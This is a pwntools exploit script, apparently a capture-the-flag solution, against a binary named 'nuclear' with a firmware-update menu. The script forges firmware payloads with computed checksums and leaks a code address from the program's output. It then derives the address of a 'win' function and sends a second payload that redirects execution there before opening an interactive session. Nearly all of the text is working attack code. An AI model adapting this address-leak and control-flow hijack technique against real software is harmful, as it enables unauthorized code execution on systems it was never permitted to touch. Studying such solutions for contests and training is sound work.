# firmware_body = p8(0x00) + p8(0x36)
# firmware_tail = b'\x00' * 505 + b'\x36'

from pwn import *

context.arch = 'amd64'
if args.REMOTE:
    p = remote('lmao.lol', 5002)
elif args.HOST:
    p = process('./nuclear')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./nuclear',
                  gdbscript='''
                  b *execute_firmware + 71
                  b *checksum + 227
                  b *execute_firmware + 103
                  b *execute_firmware + 205
                  c
                  ''')
# b * checksum + 202
# execute_firmware + 62
#
# update
header = b'FW12'
skip = b'\x38\x00\x33\x36'
r32 = b'\x32\x01' * 32
tail = b'\x35\x43'

combined = skip + r32 + tail
total_sum = sum(combined)
r6 = p8(total_sum % 256)
print('r6: ',r6.hex())
checksum = b'\x00' + r6


padding = b'\x00' * (512 - 4 - 2 - 4 - 64 - 2)

payload = header + checksum + skip + r32 + tail + padding
# 6000
p.sendlineafter(b">> 6447 Nuclear Terminal Facility (Medical Purposes Only)", b"U")
p.sendlineafter(b'>', payload)
p.recvline()

p.sendline(b'E')
# line = p.recvuntil(b'material_loaded=')
# print(line.decode('latin-1'))
# addr = p.recvline().decode('latin-1')
data = p.recvlines(11)
for d in data:
    if b'\x01' in d:
        hex_string = d.split(b'\x01')[-1].hex()
        reversed_bytes = ''.join(reversed([hex_string[i:i + 2] for i in range(0, len(hex_string), 2)]))
        address = f"0x{reversed_bytes}"
        win_int_addr = int(address, 16) - 0x222
        win_addr = p64(win_int_addr)
        print('win_addr: ', [bytes([byte]) for byte in win_addr])
        win_addr_list = b''.join(b'\x32' + bytes([byte]) for byte in win_addr)

print('win_addr_list: ',len(win_addr_list))

# rewrite from run to win
header = b'FW12'
skip = b'\x38\x00\x33\x36'
need_to_win = win_addr_list
tail = b'\x35\x43'

combined = skip + need_to_win + tail
total_sum = sum(combined)
r6 = p8(total_sum % 256)
print('r6: ',r6.hex())
checksum = b'\x00' + r6


#
padding = b'\x00' * (512 - 4 - 2 - 4 - 16 - 2)
#
payload = header + checksum + skip + need_to_win + tail + padding
# # 6000
p.sendline(b'U')
p.sendlineafter(b'>', payload)
p.recvline()

p.sendline(b'E')
# print(p.recvlines(11))
p.interactive()
